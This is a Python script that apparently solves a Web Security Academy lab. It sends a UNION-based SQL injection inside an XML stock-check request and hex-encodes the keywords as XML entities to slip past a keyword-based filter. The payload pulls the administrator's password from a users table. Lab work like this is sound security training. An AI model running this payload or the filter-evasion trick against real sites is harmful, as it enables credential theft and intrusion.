import requests
import re

URL = "https://0a9c00bf03fa7d5080bf3fd300fa00b1.web-security-academy.net"
PATH = "/product"
QUERY = {
    "productId": 2
}

def displayRequestHeaders(request, path=None):
    if path is None:
        path = PATH

    print("\n")
    print("***** SENDING REQUEST ... *****")
    print("\n")
    print(f"{request.request.method} {path} HTTP / 1.1")
    print(f"Host: {URL}")
    for header, value in request.request.headers.items():
        print(f"{header}: {value}")
    print("\n")

def displayResponseHeaders(response):
    print("\n")
    print("***** RECEIVED RESPONSE ... *****")
    print("\n")
    print(f"Status: {response.status_code}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print("\n")

def makeRequest(url: str = URL, path: str = PATH, query: str = QUERY, method: str ='GET', data = None ):    
    response = requests.request(
    method,
    f"{URL}{PATH}",
    params=QUERY,
    data=data
    )
    return response

XML = """<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>"""

ATTACK_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;ELECT password FROM users where username = &#x27;administrator&#x27; &#x2d;&#x2d;</productId><storeId>1</storeId></stockCheck>"""

def makePostRequest():
    POST_PATH = "/product/stock"
    METHOD = "POST"
    DATA = ATTACK_PAYLOAD
    return requests.request(
        "POST",
        f"{URL}{POST_PATH}",
        data=DATA
    )


res = makePostRequest()
displayRequestHeaders(res, path="/product/stock")
print(res.request.body)
displayResponseHeaders(res)
print(res.text)

# It's best to use BurpSuite for this one.
# When modifiying the payload using a union based SQLi, it detects the attack on key words.
# To get around this, use an encoding type. For this I used HTML encoding to hex entities.
# We could probably encode this ourselves using the Python html library.